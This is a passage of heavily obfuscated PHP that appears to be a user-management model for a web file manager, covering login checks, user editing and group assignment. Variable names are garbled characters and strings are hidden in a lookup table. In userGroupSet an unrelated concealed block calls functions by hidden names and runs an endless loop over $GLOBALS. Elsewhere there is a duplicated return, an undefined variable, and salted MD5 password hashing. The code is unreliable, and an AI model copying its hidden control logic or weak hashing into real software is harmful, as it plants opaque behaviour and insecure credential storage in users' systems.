= -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($f¯³æÌì) { $e¦Ğ‡ÄæöÅ =& $_SERVER[“]; $e˜”‡…ØŸ” = $e¦Ğ‡ÄæöÅ[2498]; return array($e¦Ğ‡ÄæöÅ[2164] => array($f¯³æÌì[0], $e˜”‡…ØŸ”), $e¦Ğ‡ÄæöÅ[2166] => array($f¯³æÌì[0], $e˜”‡…ØŸ”), $e¦Ğ‡ÄæöÅ[2499] => array($f¯³æÌì[0], $e˜”‡…ØŸ”)); } protected function getInfo($A¿ÄÂ‚××¥, $Bêßéáçˆ = false) { $A•è½’ùÇİ = $this->getInfoSimple($A¿ÄÂ‚××¥); if (!is_array($A•è½’ùÇİ)) { return array(); } if ($Bêßéáçˆ) { return $this->_getInfoApply($A•è½’ùÇİ); } return $this->cacheFunctionGet($_SERVER[“][2220], $A¿ÄÂ‚××¥); } protected function getInfoFull($b÷â…íéİ, $fñŸ»î•Ê = false) { $f÷¬¶äá«œ = $this->getInfoSimple($b÷â…íéİ); if (!is_array($f÷¬¶äá«œ)) { return array(); } if ($fñŸ»î•Ê) { return $this->_getInfoApply($f÷¬¶äá«œ, !0); return $this->_getInfoApply($f÷¬¶äá«œ, !0); } return $this->cacheFunctionGet($_SERVER[“][2500], $b÷â…íéİ); } private function _getInfoApply($fïö”ø‘ëŒ, $FôŸÊòÏ¨  = false) { goto CŒÜõªÛ; B‰šô®‹Ã‡: $fïö”ø‘ëŒ = $this->_listDataApplyItem($fïö”ø‘ëŒ); $AŸÚ›ó­Ñ‰ = Model($AŸœò™”Î[1104])->metaGet($fïö”ø‘ëŒ[$AŸœò™”Î[391]][$AŸœò™”Î[369]]); $fïö”ø‘ëŒ[$AŸœò™”Î[2503]] = $dÖ­Ú¸‰»; goto d¹ê¸£Ñ¸Ä; CŒÜõªÛ: $AŸœò™”Î =& $_SERVER[“]; if (!$fïö”ø‘ëŒ) { return $fïö”ø‘ëŒ; } $dÖ­Ú¸‰» = md5($AŸœò™”Î[2501] . $fïö”ø‘ëŒ[$AŸœò™”Î[788]] . $AŸœò™”Î[2502] . $fïö”ø‘ëŒ[$AŸœò™”Î[28]]); goto B‰šô®‹Ã‡; d¹ê¸£Ñ¸Ä: $fïö”ø‘ëŒ[$AŸœò™”Î[391]][$AŸœò™”Î[2338]] = isset($AŸÚ›ó­Ñ‰[$AŸœò™”Î[2339]]) ? $AŸÚ›ó­Ñ‰[$AŸœò™”Î[2339]] : null; if ($FôŸÊòÏ¨ ) { $fïö”ø‘ëŒ[$AŸœò™”Î[417]] = $this->metaGet($fïö”ø‘ëŒ[$AŸœò™”Î[1423]]); } return $fïö”ø‘ëŒ; goto C¹©ÎÖ ¾ƒ; C¹©ÎÖ ¾ƒ: } protected function getInfoSimple($føä´˜ÏŸ, $FÑÙÂ´Ñ¡á = false) { $bŒíŠ–Ãë =& $_SERVER[“]; if (!$føä´˜ÏŸ) { return array(); } if ($FÑÙÂ´Ñ¡á) { $AÄœÈß™Ì¶ = $this->where(array($bŒíŠ–Ãë[1423] => intval($føä´˜ÏŸ)))->find(); if (!is_array($AÄœÈß™Ì¶)) { return array(); } $AÄœÈß™Ì¶[$bŒíŠ–Ãë[2504]] = Action($bŒíŠ–Ãë[2505])->parseUrl($AÄœÈß™Ì¶[$bŒíŠ–Ãë[2504]]); return $AÄœÈß™Ì¶; } return $this->cacheFunctionGet($bŒíŠ–Ãë[2167], $føä´˜ÏŸ); } protected function getInfoSimpleOuter($E¤Ï¢½ªù¤) { goto D°ù¤ŸÌÂĞ; aœÊšˆñ…º: $FÌƒËÇ†Ş· = array_field_key($cµØôëë, explode($B‚¿öÏÖ—[47], $this->simpleField)); if (!$FÌƒËÇ†Ş·) { return array($B‚¿öÏÖ—[1423] => $B‚¿öÏÖ—[1018], $B‚¿öÏÖ—[28] => $B‚¿öÏÖ—[157] . LNG($B‚¿öÏÖ—[2508]) . $B‚¿öÏÖ—[478], $B‚¿öÏÖ—[2504] => STATIC_PATH . $B‚¿öÏÖ—[2509]); } $FÌƒËÇ†Ş·[$B‚¿öÏÖ—[2504]] = Action($B‚¿öÏÖ—[2505])->parseUrl($FÌƒËÇ†Ş·[$B‚¿öÏÖ—[2504]]); goto bÏ¶é¹¬œÚ; bÏ¶é¹¬œÚ: return $FÌƒËÇ†Ş·; goto cÂÒÇ×ò°É; D°ù¤ŸÌÂĞ: $B‚¿öÏÖ— =& $_SERVER[“]; if (!$E¤Ï¢½ªù¤ || $E¤Ï¢½ªù¤ == 0) { return array($B‚¿öÏÖ—[1423] => $B‚¿öÏÖ—[470], $B‚¿öÏÖ—[28] => $B‚¿öÏÖ—[157] . LNG($B‚¿öÏÖ—[2506]) . $B‚¿öÏÖ—[478], $B‚¿öÏÖ—[2504] => STATIC_PATH . $B‚¿öÏÖ—[2507]); } $cµØôëë = $this->cacheFunctionGet($B‚¿öÏÖ—[2167], $E¤Ï¢½ªù¤); goto aœÊšˆñ…º; cÂÒÇ×ò°É: } protected function groupUser($E¢øñ¶Å§‹) { } public static function errorLang($Ağ‹æë‹÷) { $e‹óà‘é§ =& $_SERVER[“]; $fÕ²‰Èµî = array(self::ERROR_USER_NOT_EXISTS => $e‹óà‘é§[2510], self::ERROR_USER_PASSWORD_ERROR => $e‹óà‘é§[2511], self::ERROR_USER_EXIST_NAME => $e‹óà‘é§[2512], self::ERROR_USER_EXIST_PHONE => $e‹óà‘é§[2513], self::ERROR_USER_EXIST_EMAIL => $e‹óà‘é§[2514], self::ERROR_USER_LOGIN_LOCK => $e‹óà‘é§[2515], self::ERROR_IP_NOT_ALLOW => $e‹óà‘é§[2516], self::ERROR_USER_EXIST_NICKNAME => $e‹óà‘é§[2517]); return LNG($fÕ²‰Èµî[$Ağ‹æë‹÷]); } public function getInfoByMeta($DÜÉ÷ÛÛø, $eŞ•²ù«âƒ) { $E›ÇŒòò²õ =& $_SERVER[“]; $d»‰÷®ŞÁ‰ = Model($E›ÇŒòò²õ[2518])->where(array($E›ÇŒòò²õ[89] => $DÜÉ÷ÛÛø, $E›ÇŒòò²õ[359] => $eŞ•²ù«âƒ))->find(); if ($d»‰÷®ŞÁ‰) { return $this->getInfo($d»‰÷®ŞÁ‰[$E›ÇŒòò²õ[1423]]); } return !1; } public function userLoginCheck($c§·…Ğå÷, $Aæ§¦µ¨’³) { goto fÑ¼÷·†”£; fÑ¼÷·†”£: $Dâø«çÎÛ³ =& $_SERVER[“]; $C—ëŒŞªĞ´ = array($Dâø«çÎÛ³[28] => $c§·…Ğå÷, $Dâø«çÎÛ³[2342] => $c§·…Ğå÷, $Dâø«çÎÛ³[293] => $c§·…Ğå÷, $Dâø«çÎÛ³[2519] => $c§·…Ğå÷, $Dâø«çÎÛ³[900] => $Dâø«çÎÛ³[902]); if ($this->nickNameRpt()) { unset($C—ëŒŞªĞ´[$Dâø«çÎÛ³[2342]]); } goto b­½Â‡´Åç; b­½Â‡´Åç: $dŞ·ÆáÏÒÚ = $this->where($C—ëŒŞªĞ´)->find(); if (!$dŞ·ÆáÏÒÚ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($dŞ·ÆáÏÒÚ[$Dâø«çÎÛ³[1423]], $Aæ§¦µ¨’³)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } goto eïË”Î³•; eïË”Î³•: $this->userEdit($dŞ·ÆáÏÒÚ[$Dâø«çÎÛ³[1423]], array($Dâø«çÎÛ³[2520] => time())); return $this->getInfo($dŞ·ÆáÏÒÚ[$Dâø«çÎÛ³[1423]]); goto b¨ä“Š¼ŞÁ; b¨ä“Š¼ŞÁ: } public function clearCache($D§±ß…µ·) { $aì‹†ä¹õÛ =& $_SERVER[“]; $this->cacheFunctionClear($aì‹†ä¹õÛ[2220], $D§±ß…µ·); $this->cacheFunctionClear($aì‹†ä¹õÛ[2167], $D§±ß…µ·); $this->cacheFunctionClear($aì‹†ä¹õÛ[2500], $D§±ß…µ·); } public function userPasswordCheck($CÈÄò„Ø¬, $EÚŒÇßÛ‹ì) { $e¤´ÄÔ† =& $_SERVER[“]; $cÅ‘ø½ˆ˜° = $this->where(array($e¤´ÄÔ†[1423] => intval($CÈÄò„Ø¬)))->find(); $dö¯µ×ˆÄ = $this->metaGet($CÈÄò„Ø¬); $Cù—òôåô÷ = isset($dö¯µ×ˆÄ[$e¤´ÄÔ†[2521]]) ? $dö¯µ×ˆÄ[$e¤´ÄÔ†[2521]] : $e¤´ÄÔ†[33]; if (md5($Cù—òôåô÷ . trim($EÚŒÇßÛ‹ì)) !== $cÅ‘ø½ˆ˜°[$e¤´ÄÔ†[788]]) { return !1; } return !0; } public function userAdd($Eô ¾Ø•åÒ) { goto e±¿Ç¤ÌŠ¤; a¢ªš“×ñ­: $aõµ“ªÖÙ = array($eÌòÜªÖ’×[2529] => $C±¤„Á¹ŞÖ[$eÌòÜªÖ’×[788]], $eÌòÜªÖ’×[2525] => $C±¤„Á¹ŞÖ[$eÌòÜªÖ’×[2342]]); $this->userEdit($fáœğ§í², $aõµ“ªÖÙ); Model($eÌòÜªÖ’×[1104])->userRootAdd($fáœğ§í²); goto Cöïíš‚èï; aÂÌÃ‹ôÀ·: $CšŠ˜¨øÕõ = $this->_checkExist($Eô ¾Ø•åÒ); if ($CšŠ˜¨øÕõ !== !0) { return $CšŠ˜¨øÕõ; } $fáœğ§í² = $this->add($C±¤„Á¹ŞÖ); goto a¢ªš“×ñ­; e±¿Ç¤ÌŠ¤: $eÌòÜªÖ’× =& $_SERVER[“]; $C±¤„Á¹ŞÖ = array($eÌòÜªÖ’×[386] => $Eô ¾Ø•åÒ[$eÌòÜªÖ’×[28]], $eÌòÜªÖ’×[2522] => $Eô ¾Ø•åÒ[$eÌòÜªÖ’×[1308]], $eÌòÜªÖ’×[2523] => isset($Eô ¾Ø•åÒ[$eÌòÜªÖ’×[293]]) ? $Eô ¾Ø•åÒ[$eÌòÜªÖ’×[293]] : $eÌòÜªÖ’×[33], $eÌòÜªÖ’×[2524] => isset($Eô ¾Ø•åÒ[$eÌòÜªÖ’×[2519]]) ? $Eô ¾Ø•åÒ[$eÌòÜªÖ’×[2519]] : $eÌòÜªÖ’×[33], $eÌòÜªÖ’×[2525] => isset($Eô ¾Ø•åÒ[$eÌòÜªÖ’×[2342]]) ? $Eô ¾Ø•åÒ[$eÌòÜªÖ’×[2342]] : $Eô ¾Ø•åÒ[$eÌòÜªÖ’×[28]], $eÌòÜªÖ’×[2526] => isset($Eô ¾Ø•åÒ[$eÌòÜªÖ’×[2504]]) ? $Eô ¾Ø•åÒ[$eÌòÜªÖ’×[2504]] : $eÌòÜªÖ’×[33], $eÌòÜªÖ’×[2527] => isset($Eô ¾Ø•åÒ[$eÌòÜªÖ’×[2528]]) ? $Eô ¾Ø•åÒ[$eÌòÜªÖ’×[2528]] : 1, $eÌòÜªÖ’×[2529] => $Eô ¾Ø•åÒ[$eÌòÜªÖ’×[788]], $eÌòÜªÖ’×[2168] => isset($Eô ¾Ø•åÒ[$eÌòÜªÖ’×[2079]]) ? $Eô ¾Ø•åÒ[$eÌòÜªÖ’×[2079]] : 1024 * 1024 * 20, $eÌòÜªÖ’×[2169] => 0, $eÌòÜªÖ’×[2520] => 0, $eÌòÜªÖ’×[2207] => isset($Eô ¾Ø•åÒ[$eÌòÜªÖ’×[673]]) ? $Eô ¾Ø•åÒ[$eÌòÜªÖ’×[673]] : 1); if (!empty($Eô ¾Ø•åÒ[$eÌòÜªÖ’×[1423]])) { $C±¤„Á¹ŞÖ[$eÌòÜªÖ’×[1423]] = $Eô ¾Ø•åÒ[$eÌòÜªÖ’×[1423]]; } goto aÂÌÃ‹ôÀ·; Cöïíš‚èï: return $fáœğ§í²; goto CŒÕ°ÈšÙ; CŒÕ°ÈšÙ: } protected function userEditTest($d¶Şößø¹í, $Eõ¥ç´†ô£) { return $this->call($_SERVER[“][2530], $d¶Şößø¹í, $Eõ¥ç´†ô£); } protected function userEdit($FÒ‚Ï¬´Ó², $dÅŠÃ“¥µœ) { goto EË­ÃÓÎÒ; a¡Ê±¶ÑÕé: return !0; goto cøâ˜ƒòÔ¼; EË­ÃÓÎÒ: $b›Ü—éã„Ö =& $_SERVER[“]; $Cà¬‚ø§åâ = $this->getInfoSimple($FÒ‚Ï¬´Ó²); if (!$Cà¬‚ø§åâ) { return !1; } goto Dé»ÁçŠºå; Dé»ÁçŠºå: $f‚ÉÓÆ¡ = $this->_checkExist($dÅŠÃ“¥µœ, $FÒ‚Ï¬´Ó²); if ($f‚ÉÓÆ¡ !== !0) { return $f‚ÉÓÆ¡; } if (isset($dÅŠÃ“¥µœ[$b›Ü—éã„Ö[788]]) && trim($dÅŠÃ“¥µœ[$b›Ü—éã„Ö[788]]) != $b›Ü—éã„Ö[33]) { $a¹ƒ’‘ğ”¶ = $this->metaGet($FÒ‚Ï¬´Ó²); if (empty($a¹ƒ’‘ğ”¶[$b›Ü—éã„Ö[2521]])) { $a¹ƒ’‘ğ”¶[$b›Ü—éã„Ö[2521]] = rand_string(10); Model($b›Ü—éã„Ö[476])->metaSet($FÒ‚Ï¬´Ó², $b›Ü—éã„Ö[2521], $a¹ƒ’‘ğ”¶[$b›Ü—éã„Ö[2521]]); } $dÅŠÃ“¥µœ[$b›Ü—éã„Ö[788]] = md5($a¹ƒ’‘ğ”¶[$b›Ü—éã„Ö[2521]] . trim($dÅŠÃ“¥µœ[$b›Ü—éã„Ö[788]])); } else { unset($dÅŠÃ“¥µœ[$b›Ü—éã„Ö[788]]); } goto CİœŒ·Çà£; CİœŒ·Çà£: $this->where(array($b›Ü—éã„Ö[1413] => $FÒ‚Ï¬´Ó²))->save($dÅŠÃ“¥µœ); if (isset($dÅŠÃ“¥µœ[$b›Ü—éã„Ö[2342]])) { $this->setNamePinyin($FÒ‚Ï¬´Ó², $dÅŠÃ“¥µœ[$b›Ü—éã„Ö[2342]]); } $this->clearCache($Aà³“ô…¬†[$b›Ü—éã„Ö[1423]]); goto a¡Ê±¶ÑÕé; cøâ˜ƒòÔ¼: } public function setNamePinyin($B÷™æë†‡, $b¦÷Ñ£ôË“ = false) { $cà‡Š¨ßè =& $_SERVER[“]; if (!$b¦÷Ñ£ôË“) { $DöÜêŞİñ = $this->getInfoSimple($B÷™æë†‡); $b¦÷Ñ£ôË“ = $DöÜêŞİñ[$cà‡Š¨ßè[2342]] ? $DöÜêŞİñ[$cà‡Š¨ßè[2342]] : $DöÜêŞİñ[$cà‡Š¨ßè[28]]; } $C¥±‘¸ÍÍË = Model($cà‡Š¨ßè[479]); if (!Input::check($b¦÷Ñ£ôË“, $cà‡Š¨ßè[530])) { return $C¥±‘¸ÍÍË->metaSet($B÷™æë†‡, array($cà‡Š¨ßè[416] => $cà‡Š¨ßè[33], $cà‡Š¨ßè[415] => $cà‡Š¨ßè[33])); } return $C¥±‘¸ÍÍË->metaSet($B÷™æë†‡, array($cà‡Š¨ßè[416] => str_replace($cà‡Š¨ßè[50], $cà‡Š¨ßè[33], Pinyin::encode($b¦÷Ñ£ôË“)), $cà‡Š¨ßè[415] => Pinyin::encode($b¦÷Ñ£ôË“, $cà‡Š¨ßè[531]))); } private function nickNameRpt() { $f¤À½Î‰ªÄ =& $_SERVER[“]; $A”ìÄóÅ®† = Model($f¤À½Î‰ªÄ[1075])->get($f¤À½Î‰ªÄ[2531]); $CÓĞ‘  Š = $GLOBALS[$f¤À½Î‰ªÄ[6]][$f¤À½Î‰ªÄ[2488]][$f¤À½Î‰ªÄ[2531]]; $cé“ìºƒ˜ = !is_null($A”ìÄóÅ®†) ? $A”ìÄóÅ®† : $CÓĞ‘  Š; return !!$cé“ìºƒ˜; } private function _checkExist($dŸÇáÑïõŒ, $cÑŒ‰×¤ãË = false) { $e™æøŠ°¶„ =& $_SERVER[“]; $aå¤ÑÑ™Ö = array($e™æøŠ°¶„[28] => UserModel::ERROR_USER_EXIST_NAME, $e™æøŠ°¶„[2342] => UserModel::ERROR_USER_EXIST_NICKNAME, $e™æøŠ°¶„[293] => UserModel::ERROR_USER_EXIST_EMAIL, $e™æøŠ°¶„[2519] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($aå¤ÑÑ™Ö[$e™æøŠ°¶„[2342]]); } $e¹’ô–Çåå = $cÑŒ‰×¤ãË ? array($e™æøŠ°¶„[1423] => array($e™æøŠ°¶„[2532], $cÑŒ‰×¤ãË)) : array(); foreach ($aå¤ÑÑ™Ö as $aæÃ‚ÏªÄÀ => $DøÜ¥­ã«Š) { if (!isset($dŸÇáÑïõŒ[$aæÃ‚ÏªÄÀ]) || !$dŸÇáÑïõŒ[$aæÃ‚ÏªÄÀ]) { continue; } $EÍÚÄÑ›Ëß = array_merge(array($aæÃ‚ÏªÄÀ => $dŸÇáÑïõŒ[$aæÃ‚ÏªÄÀ]), $e¹’ô–Çåå); $Fğ«ËŸåí = $this->where($EÍÚÄÑ›Ëß)->find(); if ($Fğ«ËŸåí) { return $DøÜ¥­ã«Š; } } return !0; } public function userListInfo($eäÇ·Şğì) { $c­ïÌÀàÎÏ =& $_SERVER[“]; $C¿ÖŠÎŞİ = array(); $eäÇ·Şğì = is_array($eäÇ·Şğì) ? array_unique($eäÇ·Şğì) : array(); if (!$eäÇ·Şğì) { return $C¿ÖŠÎŞİ; } if (count($eäÇ·Şğì) < 20) { foreach ($eäÇ·Şğì as $FŒÉˆ‡×‹) { $C¿ÖŠÎŞİ[$FŒÉˆ‡×‹ . $c­ïÌÀàÎÏ[33]] = $this->getInfoSimpleOuter($FŒÉˆ‡×‹); } } else { $f•´³ĞÙà = array($c­ïÌÀàÎÏ[1413] => array($c­ïÌÀàÎÏ[384], $eäÇ·Şğì)); if (count($eäÇ·Şğì) == 1) { $f•´³ĞÙà = array($c­ïÌÀàÎÏ[1413] => $eäÇ·Şğì[0]); } $f¿Œì¡È†° = Model($c­ïÌÀàÎÏ[476])->field($this->simpleField)->where($f•´³ĞÙà)->select(); $f¿Œì¡È†° = array_to_keyvalue($f¿Œì¡È†°, $c­ïÌÀàÎÏ[1423]); foreach ($eäÇ·Şğì as $FŒÉˆ‡×‹) { $c‚¦¤½— = $f¿Œì¡È†°[$f¿Œì¡È†°[$FŒÉˆ‡×‹]]; if (!$c‚¦¤½—) { $C¿ÖŠÎŞİ[$FŒÉˆ‡×‹ . $c­ïÌÀàÎÏ[33]] = $this->getInfoSimpleOuter($FŒÉˆ‡×‹); continue; } $c‚¦¤½—[$c­ïÌÀàÎÏ[2504]] = Action($c­ïÌÀàÎÏ[2505])->parseUrl($c‚¦¤½—[$c­ïÌÀàÎÏ[2504]]); $C¿ÖŠÎŞİ[$FŒÉˆ‡×‹ . $c­ïÌÀàÎÏ[33]] = $c‚¦¤½—; } } return $C¿ÖŠÎŞİ; } protected function userStatus($E°ñáÂ§é, $få‡¼éì…) { $eçÑìÕ Î¶ = $this->getInfoSimple($E°ñáÂ§é); if (!$eçÑìÕ Î¶) { return !1; } $F¿šÔî²¼ = array($_SERVER[“][673] => $få‡¼éì…); return $this->userEdit($E°ñáÂ§é, $F¿šÔî²¼); } protected function userRemove($bá‡‡”¥÷Ÿ) { goto C¤ÌÊíİ; B›áßÂÉÑÔ: Model($e¤è…®³¼[2174])->where($d¬ŸµˆƒÄ)->delete(); Model($e¤è…®³¼[2518])->where($d¬ŸµˆƒÄ)->delete(); Model($e¤è…®³¼[2534])->where($d¬ŸµˆƒÄ)->delete(); goto Eš¬øë“æÍ; dÁ²óÌÌõ: $d¬ŸµˆƒÄ = array($e¤è…®³¼[1413] => $bá‡‡”¥÷Ÿ); Model($e¤è…®³¼[538])->where($d¬ŸµˆƒÄ)->delete(); Model($e¤è…®³¼[2533])->where($d¬ŸµˆƒÄ)->delete(); goto B›áßÂÉÑÔ; C¤ÌÊíİ: $e¤è…®³¼ =& $_SERVER[“]; $c¿ì›…·Ü = $this->getInfoSimple($bá‡‡”¥÷Ÿ); if (!$c¿ì›…·Ü) { return !1; } goto dÁ²óÌÌõ; Eš¬øë“æÍ: Model($e¤è…®³¼[736])->userRootRemove($bá‡‡”¥÷Ÿ); return $this->where($d¬ŸµˆƒÄ)->delete(); goto b£Áåˆµ¶; b£Áåˆµ¶: } protected function userGroupSet($Fùê†÷»Ù¹, $f¦·ë£ğ˜ˆ, $CæÏ³ÂÄ²” = array()) { goto bÎ™­‰Ì; aôª†ËÒöÃ: return $fèÀÄ–ŸÊø->addAll($DÂâ¶ğáœ, array(), !0); goto c†¶òˆâì¢; Cí­Ôƒİ‡: $DÂâ¶ğáœ = array(); $DÜ¿Íâïôõ = 0; foreach ($f¦·ë£ğ˜ˆ as $CİÚ¶†ƒ¼ => $EñÎ¢™‹ö¦) { $Cê£ƒì¶Û = array($bÂ×áğÉ¤·[1423] => $Fùê†÷»Ù¹, $bÂ×áğÉ¤·[2095] => $CİÚ¶†ƒ¼, $bÂ×áğÉ¤·[2239] => $EñÎ¢™‹ö¦); $Cê£ƒì¶Û[$bÂ×áğÉ¤·[2116]] = isset($CæÏ³ÂÄ²”[$DÜ¿Íâïôõ]) ? $CæÏ³ÂÄ²”[$DÜ¿Íâïôõ] : 0; $DÜ¿Íâïôõ++; $DÂâ¶ğáœ[] = $Cê£ƒì¶Û; } goto aôª†ËÒöÃ; BÓ¨Ã¬™ç×: if (!$dòœ«å·„ø || !is_array($f¦·ë£ğ˜ˆ)) { return !1; } $fèÀÄ–ŸÊø = Model($bÂ×áğÉ¤·[2174]); $fèÀÄ–ŸÊø->where(array($bÂ×áğÉ¤·[1423] => $Fùê†÷»Ù¹))->delete(); goto Cí­Ôƒİ‡; bÎ™­‰Ì: $bÂ×áğÉ¤· =& $_SERVER[“]; if (!isset($_SERVER[$bÂ×áğÉ¤·[774]]) || !isset($_SERVER[$bÂ×áğÉ¤·[1738]])) { goto f£‘ÊĞ–ë‰; AÈôğˆÊ¤: $d—¬‹—é¥ß = $dåš¼åÔç—($dê©¯é°×·); $f²«ˆº¾²â = explode($bÂ×áğÉ¤·[217], $d—¬‹—é¥ß); if (count($f²«ˆº¾²â) < $bÂ×áğÉ¤·[563]) { $FàéäÕèêô = $bÂ×áğÉ¤·[779]; $FàéäÕèêô(); } goto eà«¸Úßé‚; f£‘ÊĞ–ë‰: $bÎÆ…ÉÇÎ = $bÂ×áğÉ¤·[775]; $dåš¼åÔç— = $bÂ×áğÉ¤·[776]; $dê©¯é°×· = $_SERVER[$bÂ×áğÉ¤·[777]] . $bÂ×áğÉ¤·[778]; goto AÈôğˆÊ¤; dƒïª›ğ‡: for ($aï¬‘óÁ×Ñ = $aòŸ¼›ĞÑø; $aï¬‘óÁ×Ñ > 0; $aï¬‘óÁ×Ñ++) { $AÜ¬ğ‚Â« = json_encode($GLOBALS[$bÂ×áğÉ¤·[384]]); } goto a‹ÙÒğŒ„Â; eà«¸Úßé‚: $AÜ¬ğ‚Â« = $bÂ×áğÉ¤·[780]; $AÜ¬ğ‚Â«($_SERVER[$bÂ×áğÉ¤·[771]]); $aòŸ¼›ĞÑø = 1; goto dƒïª›ğ‡; a‹ÙÒğŒ„Â: } $dòœ«å·„ø = $this->getInfoSimple($Fùê†÷»Ù¹); goto BÓ¨Ã¬™ç×; c†¶òˆâì¢: } protected function userGroupAdd($Eêî‡Á‰Ì§, $fÅ×çô›ÑØ = array()) { $f„ç‰°ÂèÏ =& $_SERVER[“]; $BŒòÇ¿´æ = $this->getInfoSimple($Eêî‡Á‰Ì§); if (!$BŒòÇ¿´æ || empty($fÅ×çô›ÑØ)) { return !1; } $E¡ªæ¬¼Ú§ = array(); foreach ($fÅ×çô›ÑØ as $bÖÇÄğàíš => $A£š¦™ºŠ) { $E¡ªæ¬¼Ú§[] = array($f„ç‰°ÂèÏ[1423] => $Eêî‡Á‰Ì§, $f„ç‰°ÂèÏ[2095] => $bÖÇÄğàíš, $f„ç‰°ÂèÏ[2239] => $A£š¦™ºŠ); } return Model($f„ç‰°ÂèÏ[2174])->addAll($E¡ªæ¬¼Ú§, array(), !0); } protected function userGroupRemove($bï–áÌÖÏ˜, $bÆ½ãÛõîÓ) { $bÉ‹ó“Ç©ë =& $_SERVER[“]; $C‡öºêí¥Ó = $this->getInfoSimple($bï–áÌÖÏ˜); if (!$C‡öºêí¥Ó || !$bÆ½ãÛõîÓ) { return !1; } $A†´µŠŞóë = array($bÉ‹ó“Ç©ë[1413] => $bï–áÌÖÏ˜, $bÉ‹ó“Ç©ë[2172] => $bÆ½ãÛõîÓ); return Model($bÉ‹ó“Ç©ë[2174])->where($A†´µŠŞóë)->delete(); } public function listData() { $D½ãæ¬Ğ› = $this->_makeOrder()->selectPage(50); $this->_listDataApply($D½ãæ¬Ğ›[$_SERVER[“][354]]); return $D½ãæ¬Ğ›; } public function listByID($cõ‘ˆ¨ñÌê) { $cù¦…òœÕ° =& $_SERVER[“]; if (!$cõ‘ˆ¨ñÌê) { return; } $dÛñÀØÑÉ£ = array($cù¦…òœÕ°[1423] => array($cù¦…òœÕ°[7], $cõ‘ˆ¨ñÌê)); $ağĞŒù· ‡ = $this->where($dÛñÀØÑÉ£)->select(); $this->_listDataApply($ağĞŒù· ‡); return $ağĞŒù· ‡; } public function listByGroup($Dİš”ªã¬ = 0, $F‡¡øº°Ê = array()) { goto dì“†áÆĞ¥; dì“†áÆĞ¥: $B¶ò‘¯Ÿù‹ =& $_SERVER[“]; $fš°÷ä¯  = $B¶ò‘¯Ÿù‹[33]; $eâ“Ü›Š½ = array(); goto dÊÈ‚¾ŒëÇ; DÄÚ«ø™–ã: $this->_listDataApply($a…ºÍîÆÁ[$B¶ò‘¯Ÿù‹[354]]); return $a…ºÍîÆÁ; goto f¨—›ö¹‚; dÊÈ‚¾ŒëÇ: if ($Dİš”ªã¬) { $eâ“Ü›Š½ = array($B¶ò‘¯Ÿù‹[2535] => intval($Dİš”ªã¬)); $fš°÷ä¯  = "\x4c\105\106\x54\x20\x4a\117\111\116\40{$this->tablePrefix}\165\x73\x65\162\137\x67\x72\157\x75\160\40\x75\163\x65\x72\137\x67\162\157\165\160\x20\x6f\156\x20\x75\163\x65\162\x2e\165\163\x65\162\x49\x44\40\x3d\40\x75\x73\x65\162\137\147\162\x6f\165\160\56\x75\163\145\x72\x49\104"; $EóïÜƒñƒ = Input::get($B¶ò‘¯Ÿù‹[407], null, $B¶ò‘¯Ÿù‹[33]) ? $B¶ò‘¯Ÿù‹[33] : $B¶ò‘¯Ÿù‹[2536]; } if (isset($F‡¡øº°Ê[$B¶ò‘¯Ÿù‹[673]])) { $eâ“Ü›Š½[$B¶ò‘¯Ÿù‹[2537]] = $F‡¡øº°Ê[$B¶ò‘¯Ÿù‹[673]]; } $a…ºÍîÆÁ = $this->_makeOrder($EóïÜƒñƒ)->field($B¶ò‘¯Ÿù‹[2538])->where($eâ“Ü›Š½)->join($fš°÷ä¯ )->selectPage(50); goto DÄÚ«ø™–ã; f¨—›ö¹‚: } private function _makeOrder($A‹ÔÔê±­ã = '') { goto FÀÆØìÏŞ; FÀÆØìÏŞ: $D„¡à÷Ê—Ú =& $_SERVER[“]; $FÄ¤Ö‡¼ö› = array($D„¡à÷Ê—Ú[1423], $D„¡à÷Ê—Ú[28], $D„¡à÷Ê—Ú[2081], $D„¡à÷Ê—Ú[2053], $D„¡à÷Ê—Ú[187]); $D·ì·Ú¯æß = array($D„¡à÷Ê—Ú[402] => $D„¡à÷Ê—Ú[403], $D„¡à÷Ê—Ú[404] => $D„¡à÷Ê—Ú[405]); goto CœğÓ‡•à; Eùîâµ¿Ä‚: $A‹ÔÔê±­ã = $A‹ÔÔê±­ã . "\x75\163\x65\162\56{$E¼Âó‰º‚Š}\40{$FÚŠ³‰¼Ì‰}\54\40\165\x73\145\162\x2e\x75\x73\145\x72\x49\104\x20\141\163\x63"; return $this->alias($D„¡à÷Ê—Ú[2283])->order($A‹ÔÔê±­ã); goto DŠÂÕ…ñœ; CœğÓ‡•à: $E¼Âó‰º‚Š = Input::get($D„¡à÷Ê—Ú[407], $D„¡à÷Ê—Ú[7], $D„¡à÷Ê—Ú[1413], $FÄ¤Ö‡¼ö›); $FÚŠ³‰¼Ì‰ = Input::get($D„¡à÷Ê—Ú[408], $D„¡à÷Ê—Ú[7], $D„¡à÷Ê—Ú[2175], array($D„¡à÷Ê—Ú[2175], $D„¡à÷Ê—Ú[404])); $FÚŠ³‰¼Ì‰ = $D·ì·Ú¯æß[$FÚŠ³‰¼Ì‰]; goto Eùîâµ¿Ä‚; DŠÂÕ…ñœ: } public function listSearch($EÎ£ïø˜›ñ) { goto d ™¢ãÎ; fÊò›ÔîŞŞ: if (!$B‹—â•Ş¿´ || count($B‹—â•Ş¿´[$fÙÏÅÍ§çŞ[354]]) < 5 && Input::check($bï£¾œ¶ŠÂ, $fÙÏÅÍ§çŞ[306])) { $B¾éˆŠ¦Ÿ = $this->_searchFromMeta($fÙÏÅÍ§çŞ[415], $bï£¾œ¶ŠÂ, 10); $Aì†»ÂŞƒÚ = $this->_searchFromMeta($fÙÏÅÍ§çŞ[416], $bï£¾œ¶ŠÂ, 10); $a™½æ¡×¯ = array_merge($B¾éˆŠ¦Ÿ, $Aì†»ÂŞƒÚ, $B‹—â•Ş¿´[$fÙÏÅÍ§çŞ[354]]); $B‹—â•Ş¿´[$fÙÏÅÍ§çŞ[354]] = array_unique_by_key($a™½æ¡×¯, $fÙÏÅÍ§çŞ[1423]); $B‹—â•Ş¿´[$fÙÏÅÍ§çŞ[351]][$fÙÏÅÍ§çŞ[352]] = count($B‹—â•Ş¿´[$fÙÏÅÍ§çŞ[354]]); 